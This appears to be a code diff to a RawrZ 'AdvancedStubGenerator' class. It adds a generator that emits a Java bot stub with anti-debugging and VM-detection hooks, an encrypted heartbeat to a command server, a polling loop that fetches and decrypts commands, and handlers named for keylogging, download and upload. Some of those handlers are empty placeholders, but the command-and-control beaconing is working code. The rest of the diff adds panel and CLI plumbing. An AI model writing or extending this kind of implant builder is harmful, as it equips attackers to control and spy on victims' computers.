@@ -518,6 +518,9 @@ class AdvancedStubGenerator {
             case 'javascript':
                 stubCode = this.generateJavaScriptStub(template, platform, serverUrl, botId);
                 break;
+            case 'java':
+                stubCode = this.generateJavaStub(template, platform, serverUrl, botId);
+                break;
             default:
                 throw new Error('Unsupported language: ' + language);
         }
@@ -1774,6 +1777,200 @@ stub.start();
 `;
     }
 
+    generateJavaStub(template, platform, serverUrl, botId) {
+        const features = template.features.join(', ');
+        const encryptionMethods = template.encryptionMethods.join(', ');
+        
+        return `
+// RawrZ Advanced Stub - ${template.name}
+// Features: ${features}
+// Encryption: ${encryptionMethods}
+// Generated: ${new Date().toISOString()}
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.crypto.spec.IvParameterSpec;
+import java.security.SecureRandom;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.*;
+import java.util.Base64;
+import java.nio.charset.StandardCharsets;
+
+public class RawrZStub {
+    private String serverUrl = "${serverUrl}";
+    private String botId = "${botId}";
+    private String encryptionKey = "${crypto.randomBytes(32).toString('hex')}";
+    private boolean isRunning = true;
+    private String algorithm = "AES/CBC/PKCS5Padding";
+    
+    public RawrZStub() {
+        // Constructor
+    }
+    
+    private boolean isDebuggerPresent() {
+        // Anti-debugging techniques
+        return false;
+    }
+    
+    private boolean isVirtualMachine() {
+        // VM detection techniques
+        return false;
+    }
+    
+    private String encryptData(String data) {
+        try {
+            byte[] key = encryptionKey.getBytes(StandardCharsets.UTF_8);
+            byte[] keyHash = java.security.MessageDigest.getInstance("SHA-256").digest(key);
+            
+            SecretKeySpec keySpec = new SecretKeySpec(keyHash, "AES");
+            Cipher cipher = Cipher.getInstance(algorithm);
+            
+            byte[] iv = new byte[16];
+            new SecureRandom().nextBytes(iv);
+            IvParameterSpec ivSpec = new IvParameterSpec(iv);
+            
+            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
+            byte[] encrypted = cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
+            
+            return Base64.getEncoder().encodeToString(iv) + ":" + Base64.getEncoder().encodeToString(encrypted);
+        } catch (Exception e) {
+            return data;
+        }
+    }
+    
+    private String decryptData(String encryptedData) {
+        try {
+            byte[] key = encryptionKey.getBytes(StandardCharsets.UTF_8);
+            byte[] keyHash = java.security.MessageDigest.getInstance("SHA-256").digest(key);
+            
+            SecretKeySpec keySpec = new SecretKeySpec(keyHash, "AES");
+            Cipher cipher = Cipher.getInstance(algorithm);
+            
+            String[] parts = encryptedData.split(":");
+            byte[] iv = Base64.getDecoder().decode(parts[0]);
+            byte[] encrypted = Base64.getDecoder().decode(parts[1]);
+            
+            IvParameterSpec ivSpec = new IvParameterSpec(iv);
+            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
+            
+            byte[] decrypted = cipher.doFinal(encrypted);
+            return new String(decrypted, StandardCharsets.UTF_8);
+        } catch (Exception e) {
+            return encryptedData;
+        }
+    }
+    
+    private void sendHeartbeat() {
+        new Thread(() -> {
+            while (isRunning) {
+                try {
+                    String heartbeat = "{\\"botId\\":\\"" + botId + "\\",\\"status\\":\\"alive\\",\\"timestamp\\":" + System.currentTimeMillis() / 1000 + "}";
+                    String encrypted = encryptData(heartbeat);
+                    
+                    URL url = new URL(serverUrl + "/http-bot/heartbeat");
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setRequestProperty("User-Agent", "RawrZBot/1.0");
+                    conn.setDoOutput(true);
+                    
+                    String postData = "{\\"data\\":\\"" + encrypted + "\\"}";
+                    try (OutputStream os = conn.getOutputStream()) {
+                        os.write(postData.getBytes(StandardCharsets.UTF_8));
+                    }
+                    
+                    conn.getResponseCode();
+                    conn.disconnect();
+                } catch (Exception e) {
+                    // Silent error handling
+                }
+                
+                try {
+                    Thread.sleep(30000); // 30 seconds
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        }).start();
+    }
+    
+    private void executeCommand(String command) {
+        try {
+            String[] parts = command.split(" ");
+            switch (parts[0]) {
+                case "keylog":
+                    // Start keylogging
+                    break;
+                case "download":
+                    // Download file
+                    break;
+                case "upload":
+                    // Upload file
+                    break;
+            }
+        } catch (Exception e) {
+            // Silent error handling
+        }
+    }
+    
+    public void start() {
+        // Anti-analysis checks
+        if (isDebuggerPresent() || isVirtualMachine()) {
+            return;
+        }
+        
+        // Start heartbeat
+        sendHeartbeat();
+        
+        // Main communication loop
+        new Thread(() -> {
+            while (isRunning) {
+                try {
+                    URL url = new URL(serverUrl + "/http-bot/command/" + botId);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("GET");
+                    conn.setRequestProperty("User-Agent", "RawrZBot/1.0");
+                    
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                            StringBuilder response = new StringBuilder();
+                            String line;
+                            while ((line = reader.readLine()) != null) {
+                                response.append(line);
+                            }
+                            
+                            String command = decryptData(response.toString());
+                            executeCommand(command);
+                        }
+                    }
+                    
+                    conn.disconnect();
+                } catch (Exception e) {
+                    // Silent error handling
+                }
+                
+                try {
+                    Thread.sleep(5000); // 5 seconds
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        }).start();
+    }
+    
+    public void stop() {
+        isRunning = false;
+    }
+    
+    public static void main(String[] args) {
+        RawrZStub stub = new RawrZStub();
+        stub.start();
+    }
+}`;
+    }
+
     generateBotId() {
         return 'rawrz_' + crypto.randomBytes(8).toString('hex');
     }
@@ -1856,7 +2053,7 @@ stub.start();
             if (deleted) {
                 this.stats.activeStubs = this.activeStubs.size;
                 logger.info('Deleted stub ' + botId);
-                return { success: true };
+                return { success: true, message: "Operation completed" };
             } else {
                 return { success: false, error: 'Stub not found' };
             }
@@ -1871,7 +2068,7 @@ stub.start();
             this.activeStubs.clear();
             this.stats.activeStubs = 0;
             logger.info('Cleared all stubs');
-            return { success: true };
+            return { success: true, message: "Operation completed" };
         } catch (error) {
             logger.error('Error clearing stubs:', error);
             return { success: false, error: error.message };
@@ -2389,7 +2586,7 @@ stub.start();
             const deleted = this.unpackedStubs.delete(unpackId);
             if (deleted) {
                 logger.info('Deleted unpacked stub: ' + unpackId);
-                return { success: true };
+                return { success: true, message: "Operation completed" };
             } else {
                 return { success: false, error: 'Unpacked stub not found' };
             }
@@ -2403,7 +2600,7 @@ stub.start();
         try {
             this.unpackedStubs.clear();
             logger.info('Cleared all unpacked stubs');
-            return { success: true };
+            return { success: true, message: "Operation completed" };
         } catch (error) {
             logger.error('Error clearing unpacked stubs:', error);
             return { success: false, error: error.message };
@@ -2943,6 +3140,101 @@ stub.start();
             return 'compromised';
         }
     }
+
+    // Panel Integration Methods
+    async getPanelConfig() {
+        return {
+            name: this.name,
+            version: this.version,
+            description: this.description || 'RawrZ Engine',
+            endpoints: this.getAvailableEndpoints(),
+            settings: this.getSettings(),
+            status: this.getStatus()
+        };
+    }
+    
+    getAvailableEndpoints() {
+        return [
+            { method: 'GET', path: '/api/' + this.name + '/status', description: 'Get engine status' },
+            { method: 'POST', path: '/api/' + this.name + '/initialize', description: 'Initialize engine' },
+            { method: 'POST', path: '/api/' + this.name + '/start', description: 'Start engine' },
+            { method: 'POST', path: '/api/' + this.name + '/stop', description: 'Stop engine' }
+        ];
+    }
+    
+    getSettings() {
+        return {
+            enabled: this.enabled || true,
+            autoStart: this.autoStart || false,
+            config: this.config || {}
+        };
+    }
+    
+    // CLI Integration Methods
+    async getCLICommands() {
+        return [
+            {
+                command: this.name + ' status',
+                description: 'Get engine status',
+                action: async () => {
+                    const status = this.getStatus();
+                    
+                    return status;
+                }
+            },
+            {
+                command: this.name + ' start',
+                description: 'Start engine',
+                action: async () => {
+                    const result = await this.start();
+                    
+                    return result;
+                }
+            },
+            {
+                command: this.name + ' stop',
+                description: 'Stop engine',
+                action: async () => {
+                    const result = await this.stop();
+                    
+                    return result;
+                }
+            },
+            {
+                command: this.name + ' config',
+                description: 'Get engine configuration',
+                action: async () => {
+                    const config = this.getConfig();
+                    
+                    return config;
+                }
+            }
+        ];
+    }
+    
+    getConfig() {
+        return {
+            name: this.name,
+            version: this.version,
+            enabled: this.enabled || true,
+            autoStart: this.autoStart || false,
+            settings: this.settings || {}
+        };
+    }
+
+    async getStatus() {
+        return {
+            name: this.name,
+            version: this.version,
+            status: this.initialized ? 'active' : 'inactive',
+            initialized: this.initialized,
+            encryptionEngines: this.encryptionEngines.size,
+            stubTemplates: this.stubTemplates.size,
+            tempGenerators: this.tempGenerators.size,
+            packingMethods: this.packingMethods.size
+        };
+    }
+
 }
 
 module.exports = AdvancedStubGenerator
